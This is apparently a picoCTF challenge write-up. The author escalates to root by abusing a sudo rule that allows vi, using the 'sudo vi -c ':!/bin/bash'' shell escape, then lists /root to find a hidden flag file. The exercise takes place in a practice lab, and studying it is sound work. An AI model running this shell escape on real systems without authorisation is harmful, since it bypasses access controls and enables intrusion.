## Description

>Can you read files in the root file?
>
>Additional details will be available after launching your challenge instance.

-----
This challenge asks us to read a file in the /root directory. Files located here are typically under the highest access protections possible, requiring only root permissions and rejecting any other non-super user.

Firstly, we are required to connect to the challenge machine via ssh:

```
$ ssh picoplayer@saturn.picoctf.net -p PORT
```

The port number is customized to your own launched instances.

Firstly, we can check our own user privileges:
```
picoplayer@challenge:~$ id  
uid=1000(picoplayer) gid=1000(picoplayer) groups=1000(picoplayer)
```
We can see we are not a part of root in any way, uid gid or part of the root group. It is unlikely we can access /root, so it is unsurprising to see we are denied:

```
picoplayer@challenge:/$ cd /root  
-bash: cd: /root: Permission denied
```

We need to find a way to elevate our permissions before we can go here. 

A common approach to elevating privileges is to do super-user actions, through the command `sudo`. Users are often limited in the kinds of sudo actions they can do. We can check what is allowed for our user by typing `sudo -l`:

```
picoplayer@challenge:/$ sudo -l     
Matching Defaults entries for picoplayer on challenge:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User picoplayer may run the following commands on challenge:  
   (ALL) /usr/bin/vi
```

Notably, we can run `/usr/bin/vi` as any user, including root, as noted by the (ALL). `vi` is a common text editor used to edit files. Since we are interested in reading the contents of a file, opening the file using `vi` is enough to tell us what's inside. 
```
picoplayer@challenge:/$ sudo vi /root/flag.txt
```

However, when we do this we don't see anything? This is because even though we know the location of the flag, we are still guessing if it is called flag.txt or something else. We need a way to explore the contents of the /root directory.

While `vi` has the main purpose of being a text editor, we can also abuse some of it's other features to obtain an interactive terminal session as user root:

```
sudo vi -c ':!/bin/bash'
```

Here, we launch vi with `sudo vi`. With -c flag, we specify a command `:!/bin/bash` for vi to run on launch. 
Alternatively, we can do this ourselves after launching `vi`. Simply typing `:shell` will open a shell session as the current user, in this case, root.

Now we can access /root:
```
root@challenge:~# ls  
root@challenge:~#
```

Typing `ls` shows no file in root? The challenge description mentions reading files in root, so surely something must be here:

```
root@challenge:~# ls -a  
.  ..  .bashrc  .flag.txt  .profile
```

By adding -a flag to `ls` we can see hidden files. There is our flag, under .flag.txt. So, the reason we couldn't find it earlier was because the name was indeed different from what we expected.
We can revisit to see that, once the proper name is supplied, `vi` could have been used to view file contents:
```
picoplayer@challenge:~$ sudo vi /root/.flag.txt
```

```
picoCTF{REDACTED}  
~
~
```

